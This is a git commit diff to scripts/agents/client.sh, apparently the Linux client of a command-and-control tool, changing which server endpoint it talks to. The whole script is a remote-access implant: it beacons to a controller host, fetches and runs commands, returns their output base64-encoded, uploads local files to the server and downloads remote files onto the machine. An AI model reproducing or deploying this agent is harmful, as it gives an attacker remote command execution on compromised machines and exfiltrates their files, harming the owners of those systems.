10892cac4a7cb89f3900181b35f5b98b9fb83755
Ug0Security <c.vallicari@gmail.com>
2022-10-15 14:45:27 +0200

    Update client.sh

--- scripts/agents/client.sh
+++ scripts/agents/client.sh
@@ -1,9 +1,9 @@
 #Hello
-curl -sk "$2/res.php?res=$(echo -n "Hello from Agent $1 (Linux)" | base64)&id=$1" > /dev/null
+curl -sk "$2/hey.php?m=res&res=$(echo -n "Hello from Agent $1 (Linux)" | base64)&id=$1" > /dev/null
 while true
 do
 #grab 'n' run, skip if empty
-cmds=$(curl -sk $2/cmds.php?id=$1\&o=L)
+cmds=$(curl -sk "$2/hey.php?m=cmds&id=$1&o=L")
 act=$(echo $cmds | grep $1 | cut -f 2 -d ":")
 
 if [[ $act == "run" ]];
@@ -18,14 +18,17 @@ fi
 
 res=$($run 2>&1| base64 | tr -d '\n')
 #send result
-curl -sk -X POST $2/res.php -d "res=$(echo $res)&id=$1" > /dev/null
+curl -sk "$2/hey.php?m=res&res=$(echo $res)&id=$1" > /dev/null
 sleep 10
 
 elif [[ $act == "download" ]];
 then
 file=$(echo $cmds | grep $1 | cut -f 3- -d ":")
-curl -sk -X POST $2/res.php -d "res=$(echo -n "Uploading $file" | base64)&id=$1" > /dev/null
-curl -sk -F data=@$(echo -n $file) $2/up.php?id=$1
+
+curl -sk "$2/hey.php?m=res&res=$(echo -n "Uploading $file" | base64)&id=$1" >/dev/null
+
+curl -sk -F data=@$(echo -n $file) "$2/hey.php?m=up&id=$1" >/dev/null
+
 sleep 10
 
 
@@ -35,8 +38,10 @@ url=$(echo $cmds | grep $1 | cut -f 3,4 -d ":")
 echo $url
 path=$(echo $cmds | grep $1 | cut -f 5- -d ":")
 echo $path
-curl -sk -X POST $2/res.php -d "res=$(echo -n "Downloading $url to $path" | base64)&id=$1" > /dev/null
-curl -sk  $url > $path
+
+
+curl -sk "$2/hey.php?m=res&res=$(echo -n "Downloading $url" | base64)&id=$1" > /dev/null
+curl -sk  "$url" > $path
 sleep 10
 fi
 
